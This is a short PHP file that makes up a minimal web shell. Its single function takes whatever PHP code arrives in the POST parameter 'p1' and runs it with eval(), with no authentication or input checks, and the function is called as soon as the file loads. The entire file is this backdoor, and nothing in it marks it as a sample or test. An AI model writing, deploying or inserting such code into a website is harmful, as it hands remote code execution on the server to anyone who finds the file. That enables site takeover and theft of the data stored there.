<?php
function actionPhp() {
	if(!empty($_POST['p1'])) {
		ob_start();
		eval($_POST['p1']);
	}
}

actionPhp();
?>